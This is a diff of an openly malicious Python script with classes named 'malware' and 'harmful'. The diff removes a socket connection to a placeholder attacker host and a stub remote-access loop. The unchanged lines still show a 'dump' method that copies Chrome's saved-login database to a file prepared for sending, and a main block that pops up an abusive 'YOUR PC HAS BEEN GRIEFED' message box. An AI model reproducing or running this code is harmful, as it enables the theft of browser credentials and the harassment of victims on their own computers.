@@ -1,10 +1,5 @@
-import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, socket
+import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse
 
-client = socket.socket()
-host = "ur host ip go here"
-port = 666
-format = "utf-8"
-client.connect((host, port))
 
 class harmless:
     """Harmless modules"""
@@ -116,9 +111,6 @@ class malware:
     
         
 class harmful:
-    def rat(self):
-        while 1:
-            data = client.recv(1024)
     
     def dump(self):
         """Dumps databases and thing prepared for sending"""
@@ -128,7 +120,6 @@ class harmful:
         login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
         shutil.copy2(login_db, "Loginvault.db")
 
-client.close()
 
 if __name__ == "__main__":
     ctypes.windll.user32.MessageBoxW(0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1)
@@ -170,4 +161,3 @@ if __name__ == "__main__":
     
     
     
-
